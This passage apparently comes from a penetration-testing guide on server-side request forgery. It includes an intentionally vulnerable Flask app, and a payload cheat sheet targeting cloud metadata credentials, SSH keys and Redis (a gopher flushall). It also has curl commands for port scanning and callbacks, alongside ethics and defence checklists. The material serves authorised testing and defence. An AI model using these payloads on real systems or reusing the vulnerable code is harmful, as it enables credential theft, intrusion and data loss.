- **Data Exfiltration**: Read internal files, databases, configuration
- **Remote Code Execution**: Chain SSRF with Redis, SMTP, or other services
- **Lateral Movement**: Use SSRF to reach previously inaccessible network segments
- **Compliance Violation**: Access to regulated data (PCI, HIPAA, GDPR)

## Common Pitfalls

1. **Only testing HTTP/HTTPS**: gopher://, file://, dict://, and other protocols can be more impactful.
2. **Missing blind SSRF**: Blind SSRF without response data is still dangerous for reconnaissance and chaining.
3. **Ignoring DNS rebinding**: IP validation at submission time can be bypassed with DNS rebinding.
4. **Not testing cloud metadata**: If the application runs in cloud, always test 169.254.169.254.
5. **Forgetting IMDSv2**: IMDSv2 requires token-based access; test both v1 and v2.
6. **Missing redirect bypass**: Applications may follow redirects, allowing bypass of IP filters.
7. **Not testing all ports**: Internal services on non-standard ports may be accessible.
8. **Ignoring protocol smuggling**: gopher:// can interact with non-HTTP services.
9. **Not testing localhost aliases**: nip.io, sslip.io, and other DNS services resolve to internal IPs.
10. **Missing SSRF-to-RCE chains**: SSRF alone may be low impact; chains with Redis/SMTP make it critical.

## Integration Points

### With Recon Phase

```
- Identify URL-fetching functionality in application
- Check for webhook, import, or proxy features
- Enumerate API integrations and external service connections
- Identify cloud deployment (AWS, GCP, Azure, Kubernetes)
```

### With Authentication Testing

```
- Use SSRF to access internal authentication services
- Steal authentication tokens from internal metadata
- Bypass IP-based access controls
- Access internal admin panels
```

### With File Upload Testing

```
- Use SSRF to read local files (file:// protocol)
- Chain SSRF with file upload for remote file inclusion
- Use SSRF to access uploaded files on internal storage
```

### With SQL Injection

```
- Use SSRF to reach internal database administration tools
- Chain SSRF with SQLi for deeper database access
- Use SSRF to bypass database network segmentation
```

### With RCE Hunting

```
- SSRF to Redis for command execution
- SSRF to SMTP for email injection
- SSRF to internal admin panels for RCE
- SSRF to cloud user-data for credential theft
```

## Reporting Templates

### SSRF Report Template

```
## [HIGH] Server-Side Request Forgery (SSRF)

**Endpoint**: GET /fetch?url=PAYLOAD
**Parameter**: url
**SSRF Type**: Full / Blind / Semi-Blind
**CVSS**: [Score] (High/Critical)

### Description
The application fetches a user-supplied URL without adequate validation.
An attacker can force the server to make requests to internal resources,
potentially accessing sensitive data or services.

### Steps to Reproduce
1. Send request: GET /fetch?url=http://127.0.0.1:8080/admin
2. Observe internal admin panel response returned
3. For cloud: GET /fetch?url=http://169.254.169.254/latest/meta-data/
4. Observe IAM credentials in response

### Impact
- Internal network reconnaissance
- Cloud credential theft (IAM keys)
- Access to internal services and databases
- Potential RCE via Redis/SMTP protocol smuggling

### Remediation
- Validate and whitelist allowed URLs/domains
- Block internal IP ranges and cloud metadata endpoints
- Implement network-level egress filtering
- Use IMDSv2 for AWS metadata
- Disable unnecessary protocols (gopher, file, dict)
```

## Practice Labs

### SSRF Labs Setup

```bash
# SSRF Lab (PortSwigger)
# Access: https://portswigger.net/web-security/ssrf

# WebGoat SSRF lessons
docker run -d -p 8080:8080 webgoat/webgoat

# Custom SSRF lab
git clone https://github.com/NodeSat/ssrf-lab.git
cd ssrf-lab
docker-compose up -d

# DVWA SSRF (file inclusion module)
# Set security to low, test with file:// protocol
```

### Custom SSRF Practice App

```python
# vulnerable_ssrf_app.py — Flask app with intentional SSRF
from flask import Flask, request, redirect
import requests as req
import socket

app = Flask(__name__)

@app.route("/fetch")
def fetch_url():
    url = request.args.get("url", "")
    # VULNERABLE: No validation on URL
    try:
        resp = req.get(url, timeout=5)
        return resp.text[:5000]
    except Exception as e:
        return f"Error: {e}"

@app.route("/webhook")
def webhook():
    url = request.args.get("callback", "")
    # VULNERABLE: Blind SSRF
    try:
        req.get(url, timeout=5)
        return "Webhook sent"
    except:
        return "Webhook failed"

@app.route("/pdf")
def generate_pdf():
    url = request.args.get("template", "")
    # VULNERABLE: SSRF via PDF generation
    try:
        resp = req.get(url, timeout=5)
        return f"<html><body>{resp.text}</body></html>"
    except Exception as e:
        return f"Error: {e}"

if __name__ == "__main__":
    app.run(port=5003, debug=True)
```

## Ethics

- **Authorization**: Only test SSRF on systems with explicit written permission
- **Internal Network**: Do not scan or access internal networks beyond what is necessary to prove the vulnerability
- **Cloud Metadata**: Do not exfiltrate actual cloud credentials; demonstrate access without extracting sensitive data
- **Impact Documentation**: Clearly document the potential impact of SSRF, including cloud and internal network risks
- **Responsible Disclosure**: Report SSRF vulnerabilities privately with remediation guidance
- **No Data Exfiltration**: Do not extract sensitive data from internal services during authorized testing
- **Network Safety**: Avoid disrupting internal services during SSRF testing
- **Legal Awareness**: SSRF exploitation may violate computer fraud laws without authorization
- **Testing Scope**: Stay within authorized scope; do not test unauthorized systems
- **Clean State**: Ensure testing does not leave persistent changes or backdoors

## Quick Reference

### SSRF Payload Cheat Sheet

```bash
# Internal IP testing
http://127.0.0.1/
http://localhost/
http://[::1]/
http://0.0.0.0/
http://10.0.0.1/
http://192.168.1.1/
http://172.16.0.1/

# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/computeMetadata/v1/
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# File read
file:///etc/passwd
file:///etc/hostname
file:///proc/self/environ
file:///home/user/.ssh/id_rsa

# Protocol smuggling
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
dict://127.0.0.1:6379/info
gopher://127.0.0.1:25/_HELO attacker.com

# IP bypass
http://0177.0.0.1/          (octal)
http://0x7f000001/          (hex)
http://2130706433/          (decimal)
http://[::ffff:127.0.0.1]/ (IPv6)
http://127.0.0.1.nip.io/   (DNS)
http://127.1/               (short)

# Port scanning
http://127.0.0.1:22/
http://127.0.0.1:80/
http://127.0.0.1:443/
http://127.0.0.1:3306/
http://127.0.0.1:6379/
http://127.0.0.1:8080/
http://127.0.0.1:9200/
http://127.0.0.1:27017/
```

### Quick Detection Commands

```bash
# Basic SSRF test
curl "http://target/fetch?url=http://127.0.0.1/"

# Cloud metadata test
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/"

# Blind SSRF test with callback
curl "http://target/webhook?callback=http://your-server.com/ssrf-test"

# Port scan via SSRF
for port in 22 80 443 3306 6379 8080 9200; do
    curl -s "http://target/fetch?url=http://127.0.0.1:$port/" -o /dev/null -w "Port $port: %{http_code}\n"
done

# File read via file://
curl "http://target/fetch?url=file:///etc/passwd"

# SSRFmap automated scan
ssrfmap -r request.txt -p url -m portscan
ssrfmap -r request.txt -p url -m readfiles
ssrfmap -r request.txt -p url -m redis
```

### Defense Checklist

```
☐ Validate URL domain against whitelist
☐ Block internal IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
☐ Block cloud metadata endpoints (169.254.169.254)
☐ Disable gopher://, file://, dict://, and other non-HTTP protocols
☐ Implement DNS resolution at fetch time (not validation time)
☐ Use IMDSv2 for AWS metadata (disable IMDSv1)
☐ Implement network-level egress filtering
☐ Use a dedicated fetch service with minimal privileges
☐ Set appropriate timeouts for URL fetching
☐ Log and monitor outbound connections from application
☐ Implement request signing for internal service communication
☐ Use mutual TLS for internal service authentication
```

---

**Last Updated**: 2026
**Author**: Advanced Automation Security Framework
**Version**: 2.0
**Tags**: #ssrf #cloud-metadata #dns-rebinding #gopher #internal-network #automation #blind-ssrf
